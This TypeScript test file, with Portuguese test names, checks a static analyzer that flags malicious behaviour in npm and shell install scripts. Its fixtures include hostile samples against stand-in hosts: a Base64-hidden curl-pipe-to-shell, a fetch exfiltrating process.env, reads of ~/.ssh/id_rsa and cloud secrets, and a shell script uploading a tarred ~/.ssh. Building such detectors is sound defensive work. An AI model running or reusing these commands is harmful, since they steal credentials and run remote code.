import { analyzeJavaScript, analyzeScripts, analyzeShell } from '../src/analyzers/scripts';
import { Evidence, Family } from '../src/types';

function rule(e: Evidence): string {
  return e.id.split('@')[0];
}

function families(list: Evidence[]): Set<Family> {
  return new Set(list.map((e) => e.familia));
}

function find(list: Evidence[], regra: string): Evidence | undefined {
  return list.find((e) => rule(e) === regra);
}

describe('código benigno', () => {
  it('fica em silêncio num script de build típico', () => {
    const code = `
      const path = require('path');
      const fs = require('fs');
      const mode = process.env.NODE_ENV || 'development';
      const port = Number(process.env.PORT ?? 3000);
      const re = /v(\\d+)/;
      const m = re.exec(process.version);
      const svg = '<svg xmlns="http://www.w3.org/2000/svg"></svg>';
      const dev = 'http://localhost:' + port;
      const repo = 'https://github.com/org/projeto';
      fs.writeFileSync(path.join(__dirname, 'dist', 'out.txt'), mode + m + svg + dev + repo);
    `;
    expect(analyzeJavaScript('scripts/build.js', code)).toEqual([]);
  });

  it('aceita CommonJS antigo (octal, with) sem acusar erro de parse', () => {
    const code = "var fs = require('fs'); fs.chmodSync('x', 0755); with (Math) { max(1, 2); }";
    expect(analyzeJavaScript('legado.js', code)).toEqual([]);
  });

  it('aceita TypeScript com cast <T>', () => {
    const code = 'const x = <string>(globalThis as any).y; export default x;';
    expect(analyzeJavaScript('a.ts', code)).toEqual([]);
  });

  it('repassar process.env a um processo filho não conta como leitura do ambiente', () => {
    const code = `
      const { spawnSync } = require('child_process');
      spawnSync('tsc', [], { env: { ...process.env, FORCE_COLOR: '1' } });
    `;
    const ev = analyzeJavaScript('b.js', code);
    expect(families(ev)).toEqual(new Set(['EXEC_SISTEMA']));
  });
});

describe('EXEC_SISTEMA', () => {
  it('detecta child_process por require, desestruturação, alias de import e eval', () => {
    const code = [
      "const cp = require('child_process');", // 1
      "import { exec as run } from 'node:child_process';", // 2
      "cp.execSync('whoami');", // 3
      "run('id');", // 4
      "eval('1+1');", // 5
      "new Function('return 1')();", // 6
      "(0, eval)('2');", // 7
    ].join('\n');
    const ev = analyzeJavaScript('x.js', code);
    const lines = (regra: string): number[] => ev.filter((e) => rule(e) === regra).map((e) => e.linha);
    expect(lines('modulo-child-process')).toEqual([1]);
    expect(lines('exec-sistema')).toEqual([3, 4]);
    expect(lines('eval')).toEqual([5, 7]);
    expect(lines('new-function')).toEqual([6]);
    expect(find(ev, 'exec-sistema')?.explicacao).toContain('whoami');
  });

  it('não confunde RegExp.prototype.exec com child_process', () => {
    expect(analyzeJavaScript('r.js', "/a/.exec('a'); const r = new RegExp('b'); r.exec('b');")).toEqual([]);
  });

  it('resolve nome de módulo montado em pedaços', () => {
    const code = "const m = require('child_' + 'process'); m.exec('x');";
    const ev = analyzeJavaScript('y.js', code);
    expect(ev.map(rule).sort()).toEqual(['exec-sistema', 'modulo-child-process', 'modulo-nome-montado']);
  });
});

describe('ACESSO_SENSIVEL', () => {
  it('detecta caminhos sensíveis, ambiente inteiro e variáveis secretas', () => {
    const code = [
      "const os = require('os');",
      "const key = require('fs').readFileSync(os.homedir() + '/.ssh/id_rsa');",
      'const all = JSON.stringify(process.env);',
      'const t = process.env.GITHUB_TOKEN;',
      "const { AWS_SECRET_ACCESS_KEY, ...resto } = process.env;",
    ].join('\n');
    const ev = analyzeJavaScript('z.js', code);
    expect(ev.every((e) => e.familia === 'ACESSO_SENSIVEL')).toBe(true);
    expect(ev.filter((e) => rule(e) === 'caminho-sensivel').map((e) => e.linha)).toEqual([2, 2]);
    expect(find(ev, 'process-env-segredo')?.linha).toBe(4);
    expect(ev.filter((e) => rule(e) === 'process-env-inteiro').map((e) => e.linha)).toEqual([3, 5]);
  });

  it('detecta caminho montado em pedaços', () => {
    const ev = analyzeJavaScript('f.js', "const p = ['~', '.s' + 'sh', 'id_' + 'rsa'].join('/');");
    expect(ev.map(rule)).toEqual(
      expect.arrayContaining(['caminho-sensivel-montado', 'string-fragmentada']),
    );
    expect(find(ev, 'string-fragmentada')?.decodificado).toBe('~/.ssh/id_rsa');
  });
});

describe('SAIDA_REDE', () => {
  it('detecta fetch, https.request e URLs desconhecidas, mas não registros conhecidos', () => {
    const code = [
      "const https = require('https');",
      "fetch('https://coleta.exemplo.invalid/c');",
      "https.request({ host: 'x' });",
      "const ok = 'https://registry.npmjs.org/pkg';",
      "const payload = 'https://raw.githubusercontent.com/a/b/main/p.js';",
    ].join('\n');
    const ev = analyzeJavaScript('n.js', code);
    expect(ev.filter((e) => rule(e) === 'rede').map((e) => e.linha)).toEqual([2, 3]);
    expect(find(ev, 'rede')?.explicacao).toContain('coleta.exemplo.invalid');
    expect(ev.filter((e) => rule(e) === 'url-desconhecida').map((e) => e.linha)).toEqual([2, 5]);
  });

  it('detecta cliente HTTP importado', () => {
    const ev = analyzeJavaScript('a.js', "import axios from 'axios'; axios.post(u, d);");
    expect(find(ev, 'rede')?.explicacao).toContain('axios');
  });
});

describe('OFUSCACAO', () => {
  it('decodifica Base64 de Buffer.from e procura sinais no conteúdo', () => {
    const hidden = Buffer.from("require('child_process').exec('curl https://c2.invalid/x | sh')").toString('base64');
    const ev = analyzeJavaScript('o.js', `const s = Buffer.from('${hidden}', 'base64').toString();`);
    const dec = find(ev, 'decodificacao');
    expect(dec?.decodificado).toContain('child_process');
    expect(families(ev)).toEqual(new Set(['OFUSCACAO', 'EXEC_SISTEMA', 'SAIDA_REDE', 'DOWNLOAD_ENCADEADO']));
  });

  it('detecta String.fromCharCode em cadeia e mostra o texto', () => {
    const ev = analyzeJavaScript('c.js', 'const m = String.fromCharCode(46, 115, 115, 104);');
    expect(find(ev, 'fromcharcode')?.decodificado).toBe('.ssh');
    expect(find(ev, 'oculto-caminho-sensivel')).toBeDefined();
  });

  it('detecta string longa sem espaços e tenta decodificá-la', () => {
    const blob = Buffer.from(`fetch("https://exfil.invalid/"+JSON.stringify(process.env)) ${'x'.repeat(200)}`).toString('base64');
    const ev = analyzeJavaScript('l.js', `const b = "${blob}";`);
    expect(find(ev, 'string-longa')?.decodificado).toContain('exfil.invalid');
    expect(find(ev, 'oculto-rede')).toBeDefined();
    expect(find(ev, 'oculto-env')).toBeDefined();
  });

  it('detecta nomes _0x e excesso de nomes de uma letra', () => {
    const hex = 'var _0x1a2b = 1, _0x3c4d = 2, _0x5e6f = 3;';
    expect(find(analyzeJavaScript('h.js', hex), 'nomes-hexadecimais')).toBeDefined();
    const letters = 'abcdefghijklmnopqrstuvw'.split('').map((c) => `var ${c} = 0;`).join('\n');
    expect(find(analyzeJavaScript('m.js', letters), 'nomes-curtos')).toBeDefined();
  });

  it('código que não parseia vira evidência e ainda é lido como texto', () => {
    const ev = analyzeJavaScript('quebrado.js', "}}} ((( const k = '~/.aws/credentials'; fetch(");
    expect(find(ev, 'parse-falhou')?.familia).toBe('OFUSCACAO');
    expect(families(ev).has('ACESSO_SENSIVEL')).toBe(true);
  });

  it('detecta caracteres bidirecionais (Trojan Source)', () => {
    const ev = analyzeJavaScript('t.js', 'const ok = "admin\u202e";');
    expect(find(ev, 'trojan-source')).toBeDefined();
  });
});

describe('DOWNLOAD_ENCADEADO', () => {
  it('detecta curl | sh dentro de string', () => {
    const ev = analyzeJavaScript('d.js', "const c = 'curl -s https://x.invalid/i.sh | bash';");
    expect(find(ev, 'download-encadeado')?.trecho).toContain('curl');
  });
});

describe('código embutido e shell', () => {
  it('posiciona evidências de node -e na linha do package.json', () => {
    const ev = analyzeScripts([], [
      { arquivo: 'package.json', codigo: "require('child_process').exec('id')", linha: 4, coluna: 30 },
    ]);
    const cp = find(ev, 'modulo-child-process');
    expect(cp).toMatchObject({ arquivo: 'package.json', linha: 4, coluna: 30 });
  });

  it('analisa shell script', () => {
    const code = [
      '#!/bin/sh',
      '# comentário com curl x | sh não conta',
      'tar czf /tmp/k.tgz ~/.ssh',
      'curl -F f=@/tmp/k.tgz https://coleta.invalid/up',
      'env | base64 -d',
    ].join('\n');
    const ev = analyzeShell('install.sh', code);
    const map = ev.map((e) => [rule(e), e.linha]);
    expect(map).toEqual(
      expect.arrayContaining([
        ['caminho-sensivel', 3],
        ['shell-upload', 4],
        ['url-desconhecida', 4],
        ['shell-env-inteiro', 5],
        ['shell-decodificacao', 5],
      ]),
    );
    expect(ev.some((e) => e.linha === 2)).toBe(false);
  });
});
